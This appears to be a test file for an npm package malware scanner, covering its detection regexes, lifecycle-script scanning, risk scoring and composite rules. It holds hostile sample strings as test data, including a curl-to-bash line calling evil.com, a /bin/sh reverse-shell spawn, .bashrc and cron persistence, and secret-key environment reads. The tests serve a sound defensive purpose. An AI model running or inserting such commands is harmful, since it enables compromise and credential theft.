import { describe, test, expect, beforeEach } from "bun:test";
import { scanPackageJson } from "./src/scanners/scripts.js";
import { scanSourceCode } from "./src/scanners/files.js";
import { patterns, lifecycleScriptPatterns } from "./src/patterns/index.js";
import {
  SEVERITY_SCORES,
  CONFIDENCE_MULTIPLIERS,
  calculateFindingScore,
  getRiskLevel,
} from "./src/patterns/index.js";
import { calculateProjectScore, scoreFindings } from "./src/core/scorer.js";
import { detectComposites, COMPOSITE_RULES } from "./src/core/composites.js";

describe("patterns", () => {
  test("detects eval with base64", () => {
    const code = `eval(Buffer.from('Y29uc29sZS5sb2coImhlbGxvIik=', 'base64').toString())`;
    const found = patterns.find((p) => p.id === "eval-obfuscated");
    expect(found.regex.test(code)).toBe(true);
  });

  test("detects reverse shell", () => {
    const code = `spawn('/bin/sh', ['-i'], { stdio: 'pipe' })`;
    const found = patterns.find((p) => p.id === "reverse-shell");
    expect(found.regex.test(code)).toBe(true);
  });

  test("detects crypto mining pool", () => {
    const code = `const pool = 'stratum+tcp://mine.xmr.com'`;
    const found = patterns.find((p) => p.id === "coin-mining-pools");
    expect(found.regex.test(code)).toBe(true);
  });

  test("detects bashrc modification", () => {
    const code = `fs.writeFileSync(os.homedir() + '/.bashrc', 'malicious')`;
    const found = patterns.find((p) => p.id === "bashrc-modification");
    expect(found.regex.test(code)).toBe(true);
  });

  test("detects cron persistence", () => {
    const code = `echo '* * * * * node malicious.js' >> /tmp/cron.txt`;
    const found = patterns.find((p) => p.id === "cron-persistence");
    expect(found.regex.test(code)).toBe(true);
  });

  test("detects hardcoded IP", () => {
    const code = `const ip = "192.168.1.100"`;
    const found = patterns.find((p) => p.id === "hardcoded-ip");
    expect(found.regex.test(code)).toBe(true);
  });

  test("detects AWS keys access", () => {
    const code = `const key = process.env.AWS_SECRET_ACCESS_KEY`;
    const found = patterns.find((p) => p.id === "aws-keys-access");
    expect(found.regex.test(code)).toBe(true);
  });

  test("detects VM detection", () => {
    const code = `if (platform.includes('hyperv') || platform.includes('vmware'))`;
    const found = patterns.find((p) => p.id === "vm-detection");
    expect(found.regex.test(code)).toBe(true);
  });

  test("detects slack tokens", () => {
    const code = `const token = process.env.SLACK_TOKEN`;
    const found = patterns.find((p) => p.id === "slack-discord-tokens");
    expect(found.regex.test(code)).toBe(true);
  });

  test("detects template literal obfuscation", () => {
    const code = "const url = `http://${domain}.com`";
    const found = patterns.find((p) => p.id === "template-literal-obf");
    expect(found.regex.test(code)).toBe(true);
  });

  test("detects download and execute", () => {
    const code = `curl https://evil.com/script.sh | bash`;
    const found = lifecycleScriptPatterns.find((p) => p.id === "lifecycle-pipe-shell");
    expect(found.regex.test(code)).toBe(true);
  });

  test("detects env access in lifecycle", () => {
    const code = `const apiKey = process.env.API_KEY`;
    const found = lifecycleScriptPatterns.find((p) => p.id === "lifecycle-env-access");
    expect(found.regex.test(code)).toBe(true);
  });

  test("patterns have required fields", () => {
    for (const p of patterns) {
      expect(p.id).toBeDefined();
      expect(p.severity).toBeDefined();
      expect(p.category).toBeDefined();
      expect(p.description).toBeDefined();
      expect(p.regex).toBeDefined();
      expect(p.explanation).toBeDefined();
    }
  });

  test("lifecycle patterns have required fields", () => {
    for (const p of lifecycleScriptPatterns) {
      expect(p.id).toBeDefined();
      expect(p.severity).toBeDefined();
      expect(p.category).toBeDefined();
      expect(p.description).toBeDefined();
      expect(p.regex).toBeDefined();
      expect(p.explanation).toBeDefined();
    }
  });

  test("severities are valid", () => {
    const validSeverities = ["critical", "high", "medium", "low"];
    for (const p of patterns) {
      expect(validSeverities).toContain(p.severity);
    }
  });

  test("categories are valid", () => {
    const validCategories = [
      "code-execution",
      "data-exfiltration",
      "network",
      "system-execution",
      "obfuscation",
      "credentials",
      "malware",
    ];
    for (const p of patterns) {
      expect(validCategories).toContain(p.category);
    }
  });
});

describe("scanPackageJson", () => {
  test("detects malicious postinstall script", () => {
    const findings = scanPackageJson("./examples/test-app");
    const postinstall = findings.filter((f) => f.script === "postinstall");
    expect(postinstall.length).toBeGreaterThan(0);
  });

  test("returns empty for non-existent project", () => {
    const findings = scanPackageJson("/non-existent-path");
    expect(findings).toEqual([]);
  });
});

describe("scanSourceCode", () => {
  test("detects malware in test project", () => {
    const findings = scanSourceCode("./examples/test-app");
    const critical = findings.filter((f) => f.severity === "critical");
    expect(critical.length).toBeGreaterThan(0);
  });

  test("returns empty for non-existent project", () => {
    const findings = scanSourceCode("/non-existent-path");
    expect(findings).toEqual([]);
  });

  test("detects reverse shell", () => {
    const findings = scanSourceCode("./examples/test-app");
    const reverseShell = findings.find((f) => f.patternId === "reverse-shell");
    expect(reverseShell).toBeDefined();
  });
});

describe("scoring", () => {
  test("SEVERITY_SCORES has correct values", () => {
    expect(SEVERITY_SCORES.critical).toBe(10);
    expect(SEVERITY_SCORES.high).toBe(7);
    expect(SEVERITY_SCORES.medium).toBe(3);
    expect(SEVERITY_SCORES.low).toBe(1);
  });

  test("CONFIDENCE_MULTIPLIERS has correct values", () => {
    expect(CONFIDENCE_MULTIPLIERS.high).toBe(1.5);
    expect(CONFIDENCE_MULTIPLIERS.medium).toBe(1);
    expect(CONFIDENCE_MULTIPLIERS.low).toBe(0.5);
  });

  test("calculateFindingScore applies multiplier", () => {
    const highHigh = { severity: "high", confidence: "high" };
    expect(calculateFindingScore(highHigh)).toBe(10.5); // 7 * 1.5

    const mediumLow = { severity: "medium", confidence: "low" };
    expect(calculateFindingScore(mediumLow)).toBe(1.5); // 3 * 0.5

    const criticalMed = { severity: "critical", confidence: "medium" };
    expect(calculateFindingScore(criticalMed)).toBe(10); // 10 * 1
  });

  test("getRiskLevel returns correct levels", () => {
    expect(getRiskLevel(0)).toBe("LOW");
    expect(getRiskLevel(15)).toBe("LOW");
    expect(getRiskLevel(20)).toBe("MEDIUM");
    expect(getRiskLevel(50)).toBe("HIGH");
    expect(getRiskLevel(100)).toBe("CRITICAL");
  });

  test("calculateProjectScore returns full result", () => {
    const findings = [
      { severity: "high", confidence: "high", category: "malware" },
      { severity: "medium", confidence: "medium", category: "network" },
    ];
    const result = calculateProjectScore(findings);

    expect(result.totalScore).toBeGreaterThan(0);
    expect(result.riskLevel).toBeDefined();
    expect(result.baseScore).toBeDefined();
    expect(result.bySeverity).toBeDefined();
  });

  test("calculateProjectScore handles empty findings", () => {
    const result = calculateProjectScore([]);

    expect(result.totalScore).toBe(0);
    expect(result.riskLevel).toBe("LOW");
    expect(result.findingsCount).toBe(0);
  });
});

describe("composites", () => {
  test("COMPOSITE_RULES has 4 rules", () => {
    expect(COMPOSITE_RULES.length).toBe(4);
  });

  test("detectComposites finds obfuscated-execution", () => {
    const findings = [
      { patternId: "base64-decode-exec" },
      { patternId: "eval-obfuscated" },
    ];
    const detected = detectComposites(findings);
    const found = detected.find((c) => c.id === "obfuscated-execution");

    expect(found).toBeDefined();
    expect(found.bonus).toBe(15);
  });

  test("detectComposites finds persistence-mechanism", () => {
    const findings = [
      { patternId: "bashrc-modification" },
      { patternId: "cron-persistence" },
    ];
    const detected = detectComposites(findings);
    const found = detected.find((c) => c.id === "persistence-mechanism");

    expect(found).toBeDefined();
    expect(found.bonus).toBe(25);
  });

  test("detectComposites finds env-exfiltration", () => {
    const findings = [
      { patternId: "process-env-exfil" },
      { patternId: "fetch-external" },
    ];
    const detected = detectComposites(findings);
    const found = detected.find((c) => c.id === "env-exfiltration");

    expect(found).toBeDefined();
    expect(found.bonus).toBe(20);
  });

  test("detectComposites returns empty for partial match", () => {
    const findings = [{ patternId: "base64-decode-exec" }];
    const detected = detectComposites(findings);

    expect(detected.length).toBe(0);
  });

  test("detectComposites returns empty for empty findings", () => {
    const detected = detectComposites([]);

    expect(detected.length).toBe(0);
  });
});
